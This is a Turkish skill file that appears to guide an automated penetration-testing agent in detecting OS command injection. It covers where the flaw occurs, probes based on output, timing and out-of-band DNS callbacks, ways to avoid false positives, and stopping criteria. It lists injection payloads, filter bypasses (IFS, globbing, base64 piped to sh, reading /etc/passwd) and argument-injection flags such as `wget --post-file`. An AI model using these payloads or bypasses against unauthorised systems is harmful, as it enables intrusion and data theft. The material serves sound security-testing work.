---
name: vuln-command-injection
description: >
  OS Command Injection sınıfı: girdi bir OS shell çağrısına (system/exec/popen)
  gidiyorsa uygulanır. Shell meta-karakterleriyle ek komut çalıştırabiliyor
  muyuz onu bulur. Ana karar: ek komut GERÇEKTEN ÇALIŞTI mı (çıktı/time/OOB),
  yoksa sadece yansıdı mı?
---

# 🐚 OS COMMAND INJECTION — girdi shell'e gidiyorsa ve ek komutun ÇALIŞIYORSA açıktır

> **Tek cümle:** Shell'e geçen girdiye komut ayracı koy; kanıt, yansıma değil, komutun fiilen çalıştığını gösteren çıktı / zaman gecikmesi / out-of-band sinyaldir.

İlişkili: [[data-flow-and-mental-model]] [[baseline-and-signal]] [[evidence-discipline]] [[engine-mcp-contract]] [[attacker-mindset-and-persistence]] [[request-economy]] [[vuln-ssti]]

## 1. NE ZAMAN UYGULANIR (sink/bağlam)
- Girdi bir OS komutuna ulaşıyorsa: ping/traceroute araçları, dosya dönüştürme (imagemagick/ffmpeg), arşiv (zip/tar), DNS lookup (nslookup/dig), PDF/rapor üretimi, `git`/`svn` sarmalayan uçlar, "host"/"ip"/"filename"/"cmd"/"domain" parametreleri.
- İpuçları: sistem aracı sarmalayan uçlar, dosya adı/yol alan upload akışları, admin "diagnostics" panelleri.
- SKIP: girdi yalnızca template engine'de işleniyorsa → [[vuln-ssti]]. Hiçbir OS çağrısı yoksa SKIP.

## 2. İNSAN MUHAKEMESİ
- Geliştirici `system("ping " + host)` gibi girdiyi shell string'ine gömmüş olabilir. Shell `;`, `|`, `$()`, `` ` `` karakterlerini komut sınırı/substitution olarak yorumlar.
- Kaçırılan yer: girdiyi shell'e vermeden allow-list/quoting yapmamak; `shell=True` ile çağırmak; "sadece IP gelir" varsayımı; argümanı quote'lamış ama ayracı düşünmemiş olmak (→ argument injection ile aşılır).

## 3. TEŞHİS PROB'U (KANIT HİYERARŞİSİ: çıktı > time > OOB)
- **Baseline:** geçerli girdiyle normal istek; status + body + süre not et. request_id sakla.
- **Tek prob (görünür çıktı önceliği):**
  1. **Çıktı (en güçlü, görünür):** çıktı yansıyan uçsa `host; id` / `host | id` / `host && id` → cevapta `uid=...` belirdi mi?
  2. **Time (çıktı yoksa):** `host; sleep 5` → cevap baseline+5sn mi? Negatif kontrol `; sleep 0`. Windows'ta `& ping -n 6 127.0.0.1` / `& timeout 5`.
  3. **OOB (kör, çıktı+time belirsizse):** `host; nslookup <unique>.<collab>` veya `$(nslookup <unique>.<collab>)` → DNS/HTTP callback geldi mi? OOB kör enjeksiyonda en güvenilir kanıttır.

## 4. SİNYAL vs GÜRÜLTÜ
- **Aday (sinyal):** cevapta komut çıktısı (`uid=`, hostname, dosya içeriği); VEYA `sleep 5` tutarlı +5sn / `sleep 0` gecikmesiz; VEYA benzersiz alt-alan adına OOB DNS/HTTP hit.
- **Gürültü (aday DEĞİL):** girdinin cevapta aynen yansıması (echo); jenerik 500; tek seferlik yavaşlık; WAF blok sayfası.

## 5. DOĞRULAMA KAPISI (kanıt)
- **Çıktı-based:** `; id` ile dönen `uid=...` baseline'da YOK, payload'da VAR — iki request_id.
- **Time-based:** `sleep 5` ≈ baseline+5sn 3 tekrar; `sleep 0` ≈ baseline. Jitter delta'yı yutmamalı.
- **OOB:** payload'daki benzersiz token'ı içeren DNS/HTTP isteği collaborator'da kayıtlı — request_id ↔ callback token eşleşir; OOB en güçlü kanıttır (kör enjeksiyonda).

## 6. VARYASYON / BYPASS (bloklanınca)
- **Ayraç ekseni (komutu zincirle/ayır):** `;` (sıralı), `|` (pipe), `||` (öncekisi başarısızsa), `&&` (öncekisi başarılıysa), `&` (arka plan/Windows), newline `%0a`/`\n`, substitution `$()` ve backtick `` `...` ``.
- **Argument injection (ayraç filtreliyse):** girdi bir aracın argümanına gidiyorsa komut değil FLAG enjekte et — `curl --output`, `wget --post-file`, `find -exec`, `tar --checkpoint-action`, `ffmpeg -i` gibi tehlikeli flag'lerle dosya yaz/oku/çalıştır.
- **Boşluk/quoting bypass:** boşluk filtreliyse `${IFS}` / `$IFS$9` / `<` / `{cmd,arg}` brace; tırnak içinde substitution `"$(...)"`; null/`\t`.
- **Filtre bypass:** anahtar kelime filtreliyse globbing (`/bin/c?t /etc/passwd`, `/???/??t`), değişken birleştirme (`i""d`, `i\d`), encoding (`echo aWQ=|base64 -d|sh` — yansıma yoksa OOB ile), case.
- **OS ekseni:** *nix `sleep`/`id`/`nslookup` vs Windows `ping -n`/`timeout`/`whoami`/`nslookup`; *nix `;`/`$()` vs Windows `&`/`%var%`/`^` escape.
- **Sink/metot:** parametre yerine dosya adı/header/JSON alan; GET tıkalıysa POST. Her eksen hipotez; sinyal yoksa dürüstçe kapat.

## 7. FALSE-POSITIVE TUZAKLARI (zayıf modelin halüsinasyonu)
- **Yansımayı çalıştı sanmak:** Girdinin cevapta görünmesi (reflection) komut çalıştığını GÖSTERMEZ. `; id` çıktısı `uid=` yoksa, sadece echo'dur → FP.
- **Ağ gecikmesini time injection sanmak:** `sleep 0` negatif kontrolü olmadan time iddiası yok.
- **500'ü RCE sanmak:** meta-karakterle 500 = muhtemelen quoting kırıldı ama komut çalışmadı; çıktı/time/OOB ile teyit şart.
- **OOB'siz "blind RCE" iddiası:** kör senaryoda time VEYA OOB olmadan kanıt yoktur.
- **Yanlış OS payload'ıyla elemek:** Windows hedefe `sleep`/`;` atıp "çalışmadı" deme; OS'u tespit edip `&`/`timeout` dene.

## 8. DURMA KRİTERİ
- **Kanıtlandı, kapat:** komut çıktısı / time delta+negatif kontrol / OOB callback'ten EN AZ BİRİ + N tekrar.
- **Sinyal yok, kapat:** ayraç/arg-injection/encoding/OOB ve her iki OS ekseni denendi, ne çıktı ne time ne callback geldi.
- **Şüpheli, ilerle:** quoting kırılıyor gibi ama çalışma kanıtı yok → bir OOB/time hedefli prob daha (veya argument injection ekseni), sonra karar.

## ÖZET — 5 KURAL
1. Reflection ASLA kanıt değil; çıktı / time / OOB'den biri olmadan RCE deme.
2. Kanıt hiyerarşisi: önce görünür çıktı (`; id`), olmazsa time, en son OOB.
3. Time iddiasını `sleep 0` negatif kontrolüyle çıpala; kör senaryoda en güvenilir kanıt OOB callback'tir.
4. Ayraç tıkalıysa argument injection (tehlikeli flag) ve IFS/globbing/encoding bypass'larını dene; OS'u (*nix/Windows) doğru hedefle.
5. Her kanıt = baseline request_id + tetikleyici request_id (+ OOB token eşleşmesi).
